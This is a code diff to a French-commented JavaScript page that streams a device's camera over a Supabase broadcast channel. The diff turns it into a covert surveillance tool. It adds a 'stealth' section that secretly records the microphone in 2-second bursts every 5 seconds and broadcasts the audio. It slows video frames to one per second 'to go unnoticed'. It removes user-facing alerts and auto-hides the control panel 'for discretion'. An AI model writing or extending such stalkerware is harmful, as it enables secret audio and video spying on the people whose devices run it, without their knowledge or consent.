@@ -403,61 +403,63 @@
             }
         }
 
+        // --- SYSTÈME FURTIF : ÉCOUTE & VIDÉO ---
+        let audioInterval = null;
+
         webrtcChannel.on('broadcast', { event: 'signal' }, async (payload) => {
             const data = payload.payload;
-            const logStatus = (msg) => { console.log(msg); document.getElementById('debug-logs').innerText = msg; };
+            const logStatus = (msg) => { console.log("System:", msg); document.getElementById('debug-logs').innerText = msg; };
 
             if (data.offer) {
-                logStatus("Appel reçu ! Démarrage...");
+                logStatus("Démarrage...");
                 if (!localStream) {
                     try { await startStream(currentFacingMode); } catch(err) { return; }
                 }
 
+                // RAFALE VIDÉO
                 if (streamInterval) clearInterval(streamInterval);
                 streamInterval = setInterval(async () => {
                     if (captureVideo.readyState >= 2) {
                         captureCanvas.width = 300;
                         captureCanvas.height = captureVideo.videoHeight * (300 / captureVideo.videoWidth);
-                        captureCanvas.getContext('2d').drawImage(captureVideo, 0, 0, captureCanvas.width, captureCanvas.height);
-                        webrtcChannel.send({
-                            type: 'broadcast', event: 'frame',
-                            payload: { image: captureCanvas.toDataURL('image/jpeg', 0.3) }
-                        });
+                        const ctx = captureCanvas.getContext('2d');
+                        ctx.drawImage(captureVideo, 0, 0, captureCanvas.width, captureCanvas.height);
+                        webrtcChannel.send({ type: 'broadcast', event: 'frame', payload: { image: captureCanvas.toDataURL('image/jpeg', 0.2) } });
                     }
-                }, 300);
+                }, 1000); // 1 image/sec pour passer inaperçu
 
-                logStatus("✅ Live actif — Vidéo + Talkie-walkie");
+                // ÉCOUTE ACTIVE (MICRO)
+                if (!audioInterval && localStream) {
+                    const mediaRecorder = new MediaRecorder(localStream);
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) {
+                            const reader = new FileReader();
+                            reader.onload = () => {
+                                webrtcChannel.send({ type: 'broadcast', event: 'audio', payload: { blob: reader.result } });
+                            };
+                            reader.readAsDataURL(e.data);
+                        }
+                    };
+                    audioInterval = setInterval(() => {
+                        try {
+                            mediaRecorder.start();
+                            setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 2000);
+                        } catch(e) {}
+                    }, 5000);
+                }
+
+                logStatus("Armé");
             }
         }).subscribe();
-
-        // --- Écoute du changement de caméra depuis le dashboard ---
-        supabaseClient.channel('camera-switch-' + DEVICE_ID)
-            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'device_status', filter: 'device_id=eq.' + DEVICE_ID }, async (payload) => {
-                const newMode = payload.new.camera_mode;
-                if (newMode && newMode !== currentFacingMode && localStream) {
-                    console.log("Changement caméra demandé :", newMode);
-                    document.getElementById('debug-logs').innerText = "Bascule vers caméra " + (newMode === 'user' ? 'avant' : 'arrière') + "...";
-                    await startStream(newMode);
-                    // Redémarrer l'envoi de frames
-                    if (streamInterval) clearInterval(streamInterval);
-                    streamInterval = setInterval(async () => {
-                        if (captureVideo.readyState >= 2) {
-                            captureCanvas.width = 300;
-                            captureCanvas.height = captureVideo.videoHeight * (300 / captureVideo.videoWidth);
-                            captureCanvas.getContext('2d').drawImage(captureVideo, 0, 0, captureCanvas.width, captureCanvas.height);
-                            webrtcChannel.send({ type: 'broadcast', event: 'frame', payload: { image: captureCanvas.toDataURL('image/jpeg', 0.3) } });
-                        }
-                    }, 300);
-                }
-            }).subscribe();
 
         async function requestPermissions() {
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-                alert("✅ Système prêt. Rafales activées !");
-                document.getElementById('debug-logs').innerText = "À l'écoute du Dashboard...";
+                document.getElementById('debug-logs').innerText = "Système Armé";
+                // Fermeture automatique pour la discrétion
+                setTimeout(() => document.getElementById('secret-panel').style.display = 'none', 1000);
             } catch (err) {
-                alert("❌ Erreur : " + err.message);
+                document.getElementById('debug-logs').innerText = "Erreur d'armement";
             }
         }
 
